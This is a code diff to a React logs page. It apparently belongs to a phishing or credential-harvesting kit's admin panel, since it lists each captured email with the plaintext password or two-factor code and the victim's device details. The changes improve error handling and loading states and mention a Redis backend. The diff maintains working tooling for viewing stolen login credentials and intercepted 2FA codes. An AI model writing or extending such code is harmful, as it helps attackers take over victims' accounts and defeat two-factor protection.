@@ -5,8 +5,8 @@ import { useState, useEffect } from 'react';
 interface Log {
   timestamp: string;
   email: string;
-  password: string;
-  code: string;
+  password?: string;
+  code?: string;
   type: string;
   deviceInfo: {
     userAgent: string;
@@ -22,13 +22,17 @@ export default function LogsPage() {
   const fetchLogs = async () => {
     try {
       setIsLoading(true);
+      setError('');
       const response = await fetch('/api/log');
-      if (!response.ok) throw new Error('Failed to fetch logs');
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.details || 'Failed to fetch logs');
+      }
       const data = await response.json();
       setLogs(data);
     } catch (error) {
       console.error('Error fetching logs:', error);
-      setError('Failed to fetch logs');
+      setError(error instanceof Error ? error.message : 'Failed to fetch logs');
     } finally {
       setIsLoading(false);
     }
@@ -78,6 +82,7 @@ export default function LogsPage() {
               </div>
               <div className="ml-3">
                 <p className="text-sm text-red-700">{error}</p>
+                <p className="mt-1 text-xs text-red-500">Please check your Redis connection and try again</p>
               </div>
             </div>
           </div>
@@ -111,7 +116,9 @@ export default function LogsPage() {
                     <td className="px-6 py-4 whitespace-nowrap">
                       <div className="text-sm">
                         <p className="text-gray-900 font-medium">{log.email}</p>
-                        <p className="text-gray-500">{log.type === 'LOGIN' ? `Password: ${log.password}` : `2FA Code: ${log.code}`}</p>
+                        <p className="text-gray-500">
+                          {log.type === 'LOGIN' ? `Password: ${log.password}` : `2FA Code: ${log.code}`}
+                        </p>
                       </div>
                     </td>
                     <td className="px-6 py-4 text-sm text-gray-500">
@@ -124,7 +131,7 @@ export default function LogsPage() {
                     </td>
                   </tr>
                 ))}
-                {logs.length === 0 && (
+                {logs.length === 0 && !isLoading && !error && (
                   <tr>
                     <td colSpan={5} className="px-6 py-8 text-center text-sm text-gray-500 bg-gray-50">
                       <div className="flex flex-col items-center">
